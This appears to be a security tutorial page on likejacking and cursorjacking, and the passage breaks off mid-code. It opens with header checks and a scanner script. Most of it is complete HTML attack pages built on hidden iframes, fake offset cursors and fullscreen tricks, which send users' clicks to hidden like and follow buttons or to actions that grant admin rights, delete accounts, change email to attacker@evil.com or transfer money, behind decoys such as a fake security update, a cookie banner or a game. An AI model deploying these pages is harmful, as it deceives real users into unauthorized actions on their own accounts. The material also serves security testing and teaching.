---
title: Likejacking & Cursorjacking Attack
description: Likejacking and Cursorjacking attacks covering detection, exploitation, payload crafting, bypass techniques, and tool usage.
navigation:
  icon: i-lucide-mouse-pointer-click
  title: Likejacking & Cursorjacking
---

## Overview

Likejacking and Cursorjacking are specialized variants of Clickjacking that manipulate user interactions through deceptive UI techniques. Both exploit the trust between user actions and visual feedback to perform unauthorized operations.

::note
These attacks fall under the broader UI Redressing category. They do not require any vulnerability in the application code itself — only the absence of proper framing protections.
::

### Attack Types

::card-group
  ::card
  ---
  title: Likejacking
  icon: i-lucide-thumbs-up
  ---
  Tricks users into clicking hidden social media "Like", "Share", "Follow", or "Retweet" buttons embedded in invisible iframes overlaid on legitimate-looking content.
  ::

  ::card
  ---
  title: Cursorjacking
  icon: i-lucide-pointer
  ---
  Manipulates the visual position of the cursor so the user believes they are clicking one element while the real cursor interacts with a completely different target.
  ::

  ::card
  ---
  title: Impact
  icon: i-lucide-alert-triangle
  ---
  Social engineering amplification, forced social interactions, reputation manipulation, phishing, malware distribution, unauthorized actions on authenticated sessions.
  ::

  ::card
  ---
  title: Root Cause
  icon: i-lucide-shield-off
  ---
  Missing `X-Frame-Options` header, weak or absent `Content-Security-Policy frame-ancestors` directive, and browser rendering trust in cursor positioning.
  ::
::

### How Likejacking Works

::steps{level="4"}

#### Attacker Creates Bait Page

A visually appealing page is crafted with a compelling call-to-action (e.g., "Click to play video", "Claim your prize", "Click to continue").

#### Hidden Iframe Overlay

The target page (e.g., Facebook Like button, Twitter Follow) is loaded inside an invisible iframe positioned precisely over the bait button.

#### User Clicks Bait

The user believes they are clicking the visible button, but the click is actually registered on the hidden social media button inside the iframe.

#### Action Executed

The Like, Share, Follow, or Retweet action is performed under the user's authenticated session without their knowledge.

::

### How Cursorjacking Works

::steps{level="4"}

#### Custom Cursor Replacement

The attacker replaces the system cursor with a custom image using CSS `cursor: url()` or hides it entirely and renders a fake cursor offset from the real position.

#### Visual Misdirection

The fake cursor appears several hundred pixels away from the real cursor. The user tracks the fake cursor visually.

#### User Clicks Wrong Target

When the user attempts to click using the fake cursor's apparent position, the real click lands on the attacker's intended target — a hidden button, link, or iframe.

#### Unauthorized Action Completed

The click triggers an unintended action such as granting permissions, downloading malware, or authorizing a transaction.

::

---

## Detection & Reconnaissance

### Header Analysis

Check if the target application is vulnerable to framing attacks, which is the prerequisite for both Likejacking and Cursorjacking.

```bash [Check X-Frame-Options Header]
# Using curl
curl -sI "https://target.com" | grep -i "x-frame-options"
curl -sI "https://target.com" | grep -i "content-security-policy"

# Check multiple pages
for path in / /login /dashboard /profile /settings; do
  echo "=== $path ==="
  curl -sI "https://target.com$path" | grep -iE "(x-frame-options|content-security-policy|frame-ancestors)"
done

# Using wget
wget --spider -S "https://target.com" 2>&1 | grep -iE "(x-frame|content-security|frame-ancestors)"

# Check with specific User-Agent (mobile vs desktop may differ)
curl -sI -A "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)" "https://target.com" | grep -iE "(x-frame|content-security)"
curl -sI -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" "https://target.com" | grep -iE "(x-frame|content-security)"
```

```bash [Batch Header Scanning]
# Scan list of URLs
cat urls.txt | while read url; do
  echo -n "$url: "
  xfo=$(curl -sI "$url" | grep -i "x-frame-options" | tr -d '\r')
  csp=$(curl -sI "$url" | grep -i "content-security-policy" | grep -oi "frame-ancestors[^;]*" | tr -d '\r')
  if [ -z "$xfo" ] && [ -z "$csp" ]; then
    echo "VULNERABLE - No framing protection"
  else
    echo "XFO: $xfo | CSP: $csp"
  fi
done

# Using httpx for mass scanning
cat domains.txt | httpx -silent -status-code -title -include-response-header | grep -viE "x-frame-options|frame-ancestors" | tee frameable_targets.txt

# Nuclei template scan
nuclei -l urls.txt -tags clickjacking -severity info,low,medium
```

### Social Media Button Discovery

```bash [Identify Frameable Social Targets]
# Check if Facebook Like button is frameable
curl -sI "https://www.facebook.com/plugins/like.php?href=https://target.com" | grep -iE "(x-frame|content-security)"

# Check Twitter intent pages
curl -sI "https://twitter.com/intent/tweet?url=https://target.com" | grep -iE "(x-frame|content-security)"
curl -sI "https://twitter.com/intent/follow?screen_name=targetuser" | grep -iE "(x-frame|content-security)"

# Check LinkedIn share
curl -sI "https://www.linkedin.com/sharing/share-offsite/?url=https://target.com" | grep -iE "(x-frame|content-security)"

# Check target's own Like/Share/Follow endpoints
curl -sI "https://target.com/api/like" | grep -iE "(x-frame|content-security)"
curl -sI "https://target.com/api/follow" | grep -iE "(x-frame|content-security)"
```

### Automated Vulnerability Scanning

::tabs
  :::tabs-item{icon="i-lucide-radar" label="Nuclei"}

  ```bash [Nuclei Clickjacking Detection]
  # Built-in templates
  nuclei -u "https://target.com" -tags clickjacking
  nuclei -l urls.txt -tags clickjacking -severity info,low,medium,high

  # Custom template for missing XFO
  # Save as clickjacking-check.yaml
  cat << 'EOF' > clickjacking-check.yaml
  id: clickjacking-detection
  info:
    name: Clickjacking/Likejacking Vulnerability
    severity: medium
  http:
    - method: GET
      path:
        - "{{BaseURL}}"
      matchers-condition: and
      matchers:
        - type: status
          status:
            - 200
        - type: word
          words:
            - "X-Frame-Options"
            - "frame-ancestors"
          part: header
          negative: true
  EOF

  nuclei -u "https://target.com" -t clickjacking-check.yaml
  ```

  :::

  :::tabs-item{icon="i-lucide-search" label="Burp Suite"}

  ```bash [Burp Suite Approach]
  # 1. Proxy target through Burp
  # 2. Spider/Crawl the application
  # 3. Check Proxy > HTTP History for responses lacking:
  #    - X-Frame-Options header
  #    - Content-Security-Policy frame-ancestors directive
  # 4. Use Scanner (Professional) - detects clickjacking automatically
  # 5. Manual testing in Repeater:
  #    - Send request, check response headers
  #    - Note pages with forms, buttons, authenticated actions

  # Burp Match & Replace rule to test:
  # Type: Response Header
  # Match: X-Frame-Options: DENY
  # Replace: (empty - removes the header for testing)
  ```

  :::

  :::tabs-item{icon="i-lucide-terminal" label="Custom Scripts"}

  ```python [clickjack_scanner.py]
  import requests
  import sys
  from urllib.parse import urlparse

  def check_clickjacking(url):
      try:
          r = requests.get(url, timeout=10, allow_redirects=True,
                          headers={"User-Agent": "Mozilla/5.0"})
          headers = {k.lower(): v for k, v in r.headers.items()}

          xfo = headers.get("x-frame-options", "").upper()
          csp = headers.get("content-security-policy", "")

          vulnerable = True
          protections = []

          if xfo in ["DENY", "SAMEORIGIN"]:
              vulnerable = False
              protections.append(f"XFO: {xfo}")
          elif "ALLOW-FROM" in xfo:
              protections.append(f"XFO: {xfo} (deprecated)")

          if "frame-ancestors" in csp:
              import re
              fa = re.search(r"frame-ancestors\s+([^;]+)", csp)
              if fa:
                  val = fa.group(1).strip()
                  if val in ["'none'", "'self'"]:
                      vulnerable = False
                  protections.append(f"CSP frame-ancestors: {val}")

          status = "VULNERABLE" if vulnerable else "PROTECTED"
          print(f"[{status}] {url}")
          for p in protections:
              print(f"  └── {p}")
          if vulnerable:
              print(f"  └── No framing protection found!")

          return vulnerable

      except Exception as e:
          print(f"[ERROR] {url}: {e}")
          return None

  if __name__ == "__main__":
      if len(sys.argv) < 2:
          print(f"Usage: {sys.argv[0]} <url|file>")
          sys.exit(1)

      target = sys.argv[1]
      if target.startswith("http"):
          check_clickjacking(target)
      else:
          with open(target) as f:
              for line in f:
                  url = line.strip()
                  if url:
                      check_clickjacking(url)
  ```

  :::
::

---

## Likejacking Exploitation

### Basic Likejacking PoC

::tabs
  :::tabs-item{icon="i-lucide-code" label="Facebook Like"}

  ```html [facebook_likejack.html]
  <!DOCTYPE html>
  <html>
  <head>
      <title>Watch This Amazing Video!</title>
      <style>
          body {
              background: #1a1a2e;
              color: white;
              font-family: Arial, sans-serif;
              display: flex;
              justify-content: center;
              align-items: center;
              height: 100vh;
              margin: 0;
          }
          .bait-container {
              position: relative;
              width: 600px;
              text-align: center;
          }
          .bait-button {
              background: #e94560;
              color: white;
              border: none;
              padding: 20px 60px;
              font-size: 24px;
              border-radius: 10px;
              cursor: pointer;
              position: relative;
              z-index: 1;
          }
          .bait-button:hover {
              background: #c73e54;
          }
          /* Hidden iframe containing the Facebook Like button */
          .hidden-like {
              position: absolute;
              top: 0;
              left: 0;
              width: 100%;
              height: 100%;
              opacity: 0.0001;        /* Nearly invisible */
              z-index: 2;             /* Above the bait button */
              border: none;
              pointer-events: auto;
          }
          h1 { margin-bottom: 20px; }
          p { color: #aaa; margin-bottom: 30px; }
      </style>
  </head>
  <body>
      <div class="bait-container">
          <h1>🎬 Exclusive Video Content</h1>
          <p>Click the button below to watch the full video</p>
          <button class="bait-button">▶ PLAY VIDEO</button>

          <!-- Hidden Facebook Like iframe -->
          <iframe class="hidden-like"
              src="https://www.facebook.com/plugins/like.php?href=https://attacker-page.com&layout=button&action=like"
              scrolling="no"
              allowtransparency="true">
          </iframe>
      </div>
  </body>
  </html>
  ```

  :::

  :::tabs-item{icon="i-lucide-code" label="Twitter Follow"}

  ```html [twitter_followjack.html]
  <!DOCTYPE html>
  <html>
  <head>
      <title>Download Free Software</title>
      <style>
          body {
              background: #0f0f23;
              color: white;
              font-family: 'Segoe UI', sans-serif;
              display: flex;
              justify-content: center;
              align-items: center;
              height: 100vh;
              margin: 0;
          }
          .container {
              text-align: center;
              position: relative;
          }
          .download-btn {
              background: linear-gradient(135deg, #667eea, #764ba2);
              color: white;
              border: none;
              padding: 18px 50px;
              font-size: 20px;
              border-radius: 8px;
              cursor: pointer;
              position: relative;
              z-index: 1;
          }
          .invisible-frame {
              position: absolute;
              top: 0;
              left: 0;
              width: 100%;
              height: 100%;
              opacity: 0;
              z-index: 2;
              border: none;
          }
      </style>
  </head>
  <body>
      <div class="container">
          <h1>⬇️ Download Premium Tool</h1>
          <p>Version 3.2.1 - Free for limited time</p>
          <button class="download-btn">Download Now</button>

          <!-- Hidden Twitter Follow button -->
          <iframe class="invisible-frame"
              src="https://platform.twitter.com/widgets/follow_button.html?screen_name=attacker_account&show_count=false"
              scrolling="no">
          </iframe>
      </div>
  </body>
  </html>
  ```

  :::

  :::tabs-item{icon="i-lucide-code" label="Generic Social Action"}

  ```html [generic_likejack.html]
  <!DOCTYPE html>
  <html>
  <head>
      <title>Confirm Your Age</title>
      <style>
          * { margin: 0; padding: 0; box-sizing: border-box; }
          body {
              background: #121212;
              color: #e0e0e0;
              font-family: Arial, sans-serif;
              display: flex;
              justify-content: center;
              align-items: center;
              min-height: 100vh;
          }
          .modal {
              background: #1e1e1e;
              border: 1px solid #333;
              border-radius: 12px;
              padding: 40px;
              text-align: center;
              max-width: 450px;
              position: relative;
          }
          .modal h2 { margin-bottom: 15px; font-size: 22px; }
          .modal p { color: #999; margin-bottom: 30px; }
          .btn-group { display: flex; gap: 15px; justify-content: center; }
          .btn {
              padding: 12px 40px;
              border: none;
              border-radius: 6px;
              font-size: 16px;
              cursor: pointer;
          }
          .btn-yes {
              background: #4caf50;
              color: white;
              position: relative;
          }
          .btn-no {
              background: #333;
              color: #999;
          }
          /* Precisely position iframe over the "Yes" button */
          .like-overlay {
              position: absolute;
              top: 0;
              left: 0;
              width: 100%;
              height: 100%;
              opacity: 0;
              z-index: 10;
              border: none;
              cursor: pointer;
          }
      </style>
  </head>
  <body>
      <div class="modal">
          <h2>⚠️ Age Verification</h2>
          <p>You must be 18 or older to view this content.</p>
          <div class="btn-group">
              <div style="position: relative;">
                  <button class="btn btn-yes">Yes, I'm 18+</button>
                  <iframe class="like-overlay"
                      src="https://target.com/api/like?post_id=12345"
                      scrolling="no">
                  </iframe>
              </div>
              <button class="btn btn-no">No, take me back</button>
          </div>
      </div>
  </body>
  </html>
  ```

  :::
::

### Advanced Likejacking Techniques

::tabs
  :::tabs-item{icon="i-lucide-layers" label="Multi-Click Chain"}

  ```html [multi_click_likejack.html]
  <!DOCTYPE html>
  <html>
  <head>
      <title>Complete Survey for Reward</title>
      <style>
          body {
              background: #0d1117;
              color: white;
              font-family: Arial, sans-serif;
              display: flex;
              justify-content: center;
              align-items: center;
              height: 100vh;
          }
          .survey {
              background: #161b22;
              padding: 30px;
              border-radius: 10px;
              width: 500px;
              position: relative;
          }
          .step { display: none; text-align: center; }
          .step.active { display: block; }
          .step-btn {
              background: #238636;
              color: white;
              border: none;
              padding: 15px 40px;
              font-size: 18px;
              border-radius: 6px;
              cursor: pointer;
              margin-top: 20px;
              position: relative;
          }
          .hijack-frame {
              position: absolute;
              top: 0;
              left: 0;
              width: 100%;
              height: 100%;
              opacity: 0;
              z-index: 100;
              border: none;
          }
          .progress {
              height: 4px;
              background: #30363d;
              border-radius: 2px;
              margin-bottom: 20px;
          }
          .progress-fill {
              height: 100%;
              background: #238636;
              border-radius: 2px;
              transition: width 0.3s;
          }
      </style>
  </head>
  <body>
      <div class="survey">
          <div class="progress">
              <div class="progress-fill" id="progress" style="width: 33%"></div>
          </div>

          <!-- Step 1: First like action -->
          <div class="step active" id="step1">
              <h2>Step 1 of 3</h2>
              <p>Do you enjoy watching videos online?</p>
              <div style="position: relative; display: inline-block;">
                  <button class="step-btn" onclick="nextStep(2)">Yes, Continue →</button>
                  <iframe class="hijack-frame"
                      src="https://target.com/like?page=attacker_page1"
                      scrolling="no"></iframe>
              </div>
          </div>

          <!-- Step 2: Second like action -->
          <div class="step" id="step2">
              <h2>Step 2 of 3</h2>
              <p>Would you recommend this to friends?</p>
              <div style="position: relative; display: inline-block;">
                  <button class="step-btn" onclick="nextStep(3)">Yes, Continue →</button>
                  <iframe class="hijack-frame"
                      src="https://target.com/share?url=attacker_page2"
                      scrolling="no"></iframe>
              </div>
          </div>

          <!-- Step 3: Third like/follow action -->
          <div class="step" id="step3">
              <h2>Step 3 of 3</h2>
              <p>Claim your reward now!</p>
              <div style="position: relative; display: inline-block;">
                  <button class="step-btn">🎁 Claim Reward</button>
                  <iframe class="hijack-frame"
                      src="https://target.com/follow?user=attacker_account"
                      scrolling="no"></iframe>
              </div>
          </div>
      </div>

      <script>
          function nextStep(step) {
              document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
              document.getElementById('step' + step).classList.add('active');
              document.getElementById('progress').style.width = (step * 33) + '%';
          }
      </script>
  </body>
  </html>
  ```

  :::

  :::tabs-item{icon="i-lucide-move" label="Drag-and-Drop Likejack"}

  ```html [drag_likejack.html]
  <!DOCTYPE html>
  <html>
  <head>
      <title>Drag to Unlock</title>
      <style>
          body {
              background: #1a1a2e;
              color: white;
              font-family: Arial, sans-serif;
              display: flex;
              justify-content: center;
              align-items: center;
              height: 100vh;
          }
          .slider-container {
              background: #16213e;
              border-radius: 50px;
              padding: 5px;
              width: 350px;
              position: relative;
              height: 60px;
          }
          .slider-track {
              text-align: center;
              line-height: 50px;
              color: #555;
              font-size: 14px;
          }
          .slider-thumb {
              width: 50px;
              height: 50px;
              background: #0f3460;
              border-radius: 50%;
              position: absolute;
              top: 5px;
              left: 5px;
              cursor: grab;
              display: flex;
              align-items: center;
              justify-content: center;
              font-size: 20px;
              user-select: none;
          }
          /* Hidden target over the drag endpoint */
          .drop-target {
              position: absolute;
              right: 0;
              top: 0;
              width: 80px;
              height: 60px;
              z-index: 10;
          }
          .drop-target iframe {
              width: 100%;
              height: 100%;
              opacity: 0;
              border: none;
          }
      </style>
  </head>
  <body>
      <div>
          <h2 style="margin-bottom: 20px;">🔓 Slide to Unlock Content</h2>
          <div class="slider-container">
              <div class="slider-track">Slide to unlock →</div>
              <div class="slider-thumb" draggable="true">→</div>
              <div class="drop-target">
                  <iframe src="https://target.com/api/like?item=12345"></iframe>
              </div>
          </div>
      </div>
  </body>
  </html>
  ```

  :::

  :::tabs-item{icon="i-lucide-smartphone" label="Mobile Likejack"}

  ```html [mobile_likejack.html]
  <!DOCTYPE html>
  <html>
  <head>
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
      <title>Tap to Continue</title>
      <style>
          * { margin: 0; padding: 0; box-sizing: border-box; }
          body {
              background: #000;
              color: white;
              font-family: -apple-system, BlinkMacSystemFont, sans-serif;
              min-height: 100vh;
              display: flex;
              flex-direction: column;
              justify-content: center;
              align-items: center;
              padding: 20px;
          }
          .content {
              text-align: center;
              max-width: 90vw;
          }
          .tap-area {
              position: relative;
              display: inline-block;
              margin-top: 30px;
          }
          .visible-btn {
              background: #ff6b6b;
              color: white;
              border: none;
              padding: 20px 60px;
              font-size: 20px;
              border-radius: 12px;
              -webkit-tap-highlight-color: transparent;
              touch-action: manipulation;
          }
          /* Full-screen tap target for mobile */
          .mobile-overlay {
              position: fixed;
              top: 0;
              left: 0;
              width: 100vw;
              height: 100vh;
              z-index: 999;
              opacity: 0;
              border: none;
          }
          /* Show overlay only when button area is tapped */
          .tap-area .like-frame {
              position: absolute;
              top: 0;
              left: 0;
              width: 100%;
              height: 100%;
              opacity: 0;
              z-index: 10;
              border: none;
          }
      </style>
  </head>
  <body>
      <div class="content">
          <h1>📱 Mobile Content</h1>
          <p style="color:#888; margin-top:10px;">Tap below to access exclusive content</p>
          <div class="tap-area">
              <button class="visible-btn">Tap to Continue</button>
              <iframe class="like-frame"
                  src="https://target.com/api/follow?user=attacker"
                  scrolling="no">
              </iframe>
          </div>
      </div>
  </body>
  </html>
  ```

  :::
::

---

## Cursorjacking Exploitation

### CSS Cursor Manipulation

::tabs
  :::tabs-item{icon="i-lucide-pointer" label="Basic Cursorjack"}

  ```html [basic_cursorjack.html]
  <!DOCTYPE html>
  <html>
  <head>
      <title>Important Security Update</title>
      <style>
          body {
              background: #0d1117;
              color: #c9d1d9;
              font-family: 'Segoe UI', sans-serif;
              margin: 0;
              /* Hide the real cursor on the entire page */
              cursor: none;
              min-height: 100vh;
              overflow: hidden;
          }
          .page-content {
              padding: 50px;
              max-width: 800px;
              margin: 0 auto;
          }
          /* Fake cursor element - offset from real position */
          #fake-cursor {
              position: fixed;
              width: 16px;
              height: 16px;
              pointer-events: none;
              z-index: 99999;
              /* Cursor image */
              background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16"><path d="M0 0 L0 14 L4 10 L7 16 L9 15 L6 9 L11 9 Z" fill="white" stroke="black" stroke-width="1"/></svg>') no-repeat;
          }
          .action-area {
              display: flex;
              gap: 20px;
              margin-top: 30px;
          }
          .btn {
              padding: 15px 40px;
              border: none;
              border-radius: 8px;
              font-size: 16px;
              cursor: none;
          }
          .btn-safe {
              background: #238636;
              color: white;
          }
          .btn-cancel {
              background: #21262d;
              color: #c9d1d9;
              border: 1px solid #30363d;
          }
          /* Hidden target positioned where real cursor clicks */
          .real-target {
              position: absolute;
              opacity: 0;
              z-index: 1000;
          }
          .real-target iframe {
              border: none;
              width: 200px;
              height: 50px;
          }
      </style>
  </head>
  <body>
      <div class="page-content">
          <h1>🔒 Security Update Required</h1>
          <p>Your browser requires a critical security update. Please click "Install Update" to proceed.</p>

          <div class="action-area">
              <!-- User sees and tracks fake cursor toward this button -->
              <button class="btn btn-safe">Install Update</button>
              <button class="btn btn-cancel">Remind Me Later</button>
          </div>

          <!-- Real click target is offset from where user thinks they click -->
          <div class="real-target" id="realTarget">
              <iframe src="https://target.com/grant-permission?scope=admin"></iframe>
          </div>
      </div>

      <!-- Fake cursor that is offset from real cursor position -->
      <div id="fake-cursor"></div>

      <script>
          const fakeCursor = document.getElementById('fake-cursor');
          const realTarget = document.getElementById('realTarget');

          // Offset: fake cursor appears 200px right, 150px down from real cursor
          const offsetX = 200;
          const offsetY = 150;

          document.addEventListener('mousemove', function(e) {
              // Show fake cursor offset from real position
              fakeCursor.style.left = (e.clientX + offsetX) + 'px';
              fakeCursor.style.top = (e.clientY + offsetY) + 'px';

              // Position real target under actual cursor
              realTarget.style.left = (e.clientX - 10) + 'px';
              realTarget.style.top = (e.clientY - 10) + 'px';
          });
      </script>
  </body>
  </html>
  ```

  :::

  :::tabs-item{icon="i-lucide-pointer" label="CSS Custom Cursor"}

  ```html [css_cursorjack.html]
  <!DOCTYPE html>
  <html>
  <head>
      <title>Online Game</title>
      <style>
          body {
              background: #111;
              color: white;
              font-family: Arial, sans-serif;
              margin: 0;
              min-height: 100vh;
              /*
               * Custom cursor with built-in offset.
               * The cursor image is a large transparent PNG with the
               * arrow drawn 200px to the right of the actual hotspot.
               * Hotspot remains at 0,0 (real click position).
               */
              cursor: url('data:image/png;base64,CURSOR_IMAGE_BASE64_HERE') 0 0, auto;
          }
          .game-area {
              display: flex;
              justify-content: center;
              align-items: center;
              height: 100vh;
              position: relative;
          }
          /* Visible "safe" button - where user thinks they click */
          .visible-target {
              position: absolute;
              right: 200px;
              top: 50%;
              transform: translateY(-50%);
          }
          .game-btn {
              background: #4ecdc4;
              color: #111;
              border: none;
              padding: 20px 50px;
              font-size: 22px;
              border-radius: 10px;
              font-weight: bold;
          }
          /* Real target - where actual click lands */
          .hidden-target {
              position: absolute;
              left: 200px;   /* 200px offset from visible button */
              top: 50%;
              transform: translateY(-50%);
              opacity: 0;
          }
          .hidden-target iframe {
              width: 200px;
              height: 60px;
              border: none;
          }
      </style>
  </head>
  <body>
      <div class="game-area">
          <h1 style="position:absolute; top:40px;">🎮 Click to Start Game</h1>
          <div class="visible-target">
              <button class="game-btn">▶ START</button>
          </div>
          <div class="hidden-target">
              <iframe src="https://target.com/api/authorize?action=approve"></iframe>
          </div>
      </div>
  </body>
  </html>
  ```

  :::

  :::tabs-item{icon="i-lucide-pointer" label="Canvas Cursorjack"}

  ```html [canvas_cursorjack.html]
  <!DOCTYPE html>
  <html>
  <head>
      <title>Interactive Demo</title>
      <style>
          body {
              margin: 0;
              overflow: hidden;
              cursor: none;
              background: #0a0a0a;
          }
          canvas {
              position: fixed;
              top: 0;
              left: 0;
              z-index: 99998;
              pointer-events: none;
          }
          .content {
              position: relative;
              z-index: 1;
              color: white;
              font-family: Arial, sans-serif;
              padding: 50px;
          }
          .malicious-frame {
              position: fixed;
              opacity: 0.0001;
              z-index: 2;
              border: none;
          }
      </style>
  </head>
  <body>
      <canvas id="cursorCanvas"></canvas>

      <div class="content">
          <h1>Interactive Presentation</h1>
          <p>Move your mouse and click anywhere to proceed.</p>
          <br><br>
          <button style="padding:15px 40px; font-size:18px; cursor:none;">
              Click to Continue
          </button>
      </div>

      <!-- Hidden iframe at known position -->
      <iframe class="malicious-frame" id="target"
          src="https://target.com/settings/delete-account?confirm=true"
          style="width:200px; height:50px; left:150px; top:300px;">
      </iframe>

      <script>
          const canvas = document.getElementById('cursorCanvas');
          const ctx = canvas.getContext('2d');
          canvas.width = window.innerWidth;
          canvas.height = window.innerHeight;

          // Cursor offset
          const cursorOffsetX = 300;
          const cursorOffsetY = 200;

          document.addEventListener('mousemove', function(e) {
              ctx.clearRect(0, 0, canvas.width, canvas.height);

              // Draw fake cursor at offset position
              const fakeX = e.clientX + cursorOffsetX;
              const fakeY = e.clientY + cursorOffsetY;

              ctx.beginPath();
              ctx.moveTo(fakeX, fakeY);
              ctx.lineTo(fakeX, fakeY + 18);
              ctx.lineTo(fakeX + 5, fakeY + 14);
              ctx.lineTo(fakeX + 9, fakeY + 20);
              ctx.lineTo(fakeX + 11, fakeY + 19);
              ctx.lineTo(fakeX + 7, fakeY + 13);
              ctx.lineTo(fakeX + 13, fakeY + 13);
              ctx.closePath();
              ctx.fillStyle = 'white';
              ctx.fill();
              ctx.strokeStyle = 'black';
              ctx.lineWidth = 1;
              ctx.stroke();
          });

          window.addEventListener('resize', function() {
              canvas.width = window.innerWidth;
              canvas.height = window.innerHeight;
          });
      </script>
  </body>
  </html>
  ```

  :::
::

### Advanced Cursorjacking Techniques

::tabs
  :::tabs-item{icon="i-lucide-eye-off" label="Disappearing Cursor"}

  ```html [disappearing_cursor.html]
  <!DOCTYPE html>
  <html>
  <head>
      <title>Cookie Consent</title>
      <style>
          body {
              background: #f5f5f5;
              font-family: Arial, sans-serif;
              margin: 0;
          }
          .normal-page {
              padding: 50px;
              max-width: 800px;
              margin: 0 auto;
          }
          /* Cookie banner at bottom */
          .cookie-banner {
              position: fixed;
              bottom: 0;
              left: 0;
              right: 0;
              background: #2d2d2d;
              color: white;
              padding: 20px 30px;
              display: flex;
              justify-content: space-between;
              align-items: center;
              z-index: 1000;
          }
          .cookie-btn {
              background: #4CAF50;
              color: white;
              border: none;
              padding: 12px 30px;
              border-radius: 5px;
              font-size: 16px;
              cursor: pointer;
          }
          /* Hidden iframe positioned over "Accept" */
          .overlay-frame {
              position: fixed;
              bottom: 10px;
              right: 30px;
              width: 150px;
              height: 50px;
              opacity: 0;
              z-index: 1001;
              border: none;
          }
      </style>
  </head>
  <body>
      <div class="normal-page">
          <h1>Welcome to Our Website</h1>
          <p>Browse our content freely...</p>
      </div>

      <div class="cookie-banner">
          <span>We use cookies to improve your experience.</span>
          <button class="cookie-btn">Accept All Cookies</button>
      </div>

      <!-- Hidden action over the Accept button -->
      <iframe class="overlay-frame"
          src="https://target.com/api/grant-access?role=admin&user=attacker">
      </iframe>

      <script>
          // After a short delay, briefly switch cursor to confuse
          // user about exact click position
          const banner = document.querySelector('.cookie-banner');
          banner.addEventListener('mouseenter', function() {
              // Briefly hide cursor for disorientation
              document.body.style.cursor = 'none';
              setTimeout(() => {
                  document.body.style.cursor = 'default';
              }, 100);
          });
      </script>
  </body>
  </html>
  ```

  :::

  :::tabs-item{icon="i-lucide-maximize" label="Fullscreen Cursorjack"}

  ```html [fullscreen_cursorjack.html]
  <!DOCTYPE html>
  <html>
  <head>
      <title>Video Player</title>
      <style>
          body {
              margin: 0;
              background: #000;
              overflow: hidden;
          }
          .video-container {
              width: 100vw;
              height: 100vh;
              display: flex;
              justify-content: center;
              align-items: center;
              position: relative;
          }
          .play-btn {
              width: 80px;
              height: 80px;
              background: rgba(255,255,255,0.2);
              border-radius: 50%;
              display: flex;
              justify-content: center;
              align-items: center;
              font-size: 40px;
              color: white;
              cursor: pointer;
              transition: transform 0.2s;
          }
          .play-btn:hover { transform: scale(1.1); }
          .fs-overlay {
              position: fixed;
              top: 0;
              left: 0;
              width: 100%;
              height: 100%;
              z-index: 9999;
              opacity: 0;
              border: none;
              display: none;
          }
      </style>
  </head>
  <body>
      <div class="video-container" id="videoContainer">
          <div class="play-btn" onclick="goFullscreen()">▶</div>
      </div>

      <iframe class="fs-overlay" id="malFrame"
          src="https://target.com/settings/change-email?email=attacker@evil.com&confirm=1">
      </iframe>

      <script>
          function goFullscreen() {
              const elem = document.documentElement;
              if (elem.requestFullscreen) {
                  elem.requestFullscreen().then(() => {
                      /*
                       * In fullscreen mode, the browser's URL bar disappears.
                       * User cannot see they are on an attacker page.
                       * Now show the hidden frame and manipulate cursor.
                       */
                      document.getElementById('malFrame').style.display = 'block';
                      document.body.style.cursor = 'none';

                      // Create fake cursor with offset
                      const fake = document.createElement('div');
                      fake.id = 'fakeCur';
                      fake.style.cssText = `
                          position:fixed; width:20px; height:20px;
                          pointer-events:none; z-index:99999;
                          background:url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20"><path d="M0 0L0 16L4.5 12L7 18L9 17L6.5 11L11 11Z" fill="white" stroke="black"/></svg>') no-repeat;
                      `;
                      document.body.appendChild(fake);

                      document.addEventListener('mousemove', function(e) {
                          fake.style.left = (e.clientX + 250) + 'px';
                          fake.style.top = (e.clientY + 180) + 'px';
                      });
                  });
              }
          }
      </script>
  </body>
  </html>
  ```

  :::

  :::tabs-item{icon="i-lucide-timer" label="Timing-Based Cursorjack"}

  ```html [timing_cursorjack.html]
  <!DOCTYPE html>
  <html>
  <head>
      <title>Quick Reaction Game</title>
      <style>
          body {
              background: #1a1a2e;
              color: white;
              font-family: Arial, sans-serif;
              margin: 0;
              display: flex;
              justify-content: center;
              align-items: center;
              height: 100vh;
          }
          .game {
              text-align: center;
              position: relative;
          }
          .target-circle {
              width: 100px;
              height: 100px;
              border-radius: 50%;
              background: #e94560;
              margin: 30px auto;
              cursor: pointer;
              transition: all 0.1s;
              position: relative;
          }
          .target-circle:hover { transform: scale(1.05); }
          .target-circle:active { transform: scale(0.95); }
          #score { font-size: 36px; margin: 20px 0; }
          .swap-frame {
              position: absolute;
              width: 100px;
              height: 100px;
              border-radius: 50%;
              opacity: 0;
              z-index: 100;
              border: none;
              display: none;
          }
      </style>
  </head>
  <body>
      <div class="game">
          <h1>⚡ Click the Circle!</h1>
          <p>Click as fast as you can when it turns green!</p>
          <div id="score">Score: 0</div>
          <div style="position:relative; display:inline-block;">
              <div class="target-circle" id="circle" onclick="clicked()"></div>
              <iframe class="swap-frame" id="swapFrame"
                  src="https://target.com/api/transfer?amount=100&to=attacker">
              </iframe>
          </div>
      </div>

      <script>
          let score = 0;
          let round = 0;

          function clicked() {
              score++;
              document.getElementById('score').textContent = 'Score: ' + score;
              round++;

              // After 3 legitimate clicks (user is in rhythm),
              // swap with hidden iframe on the next click
              if (round === 3) {
                  setTimeout(() => {
                      const frame = document.getElementById('swapFrame');
                      frame.style.display = 'block';
                      // Frame is transparent and positioned over circle
                      // Next click hits the iframe instead
                  }, 500);
              }
          }

          // Color change game to build clicking rhythm
          setInterval(() => {
              const circle = document.getElementById('circle');
              circle.style.background = Math.random() > 0.5 ? '#4ecdc4' : '#e94560';
          }, 1500);
      </script>
  </body>
  </html>
  ```

  :::
::

---

## Combination Attacks

### Likejacking + Cursorjacking Combined

```html [combined_attack.html]
<!DOCTYPE html>
<html>
<head>
    <title>Verify Your Identity</title>
    <style>
        body {
            background: #0f0f23;
            color: #e0e0e0;
            font-family: 'Segoe UI', sans-serif;
            margin: 0;
            cursor: none;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        #fakeCursor {
            position: fixed;
            pointer-events: none;
            z-index: 99999;
            width: 16px;
            height: 20px;
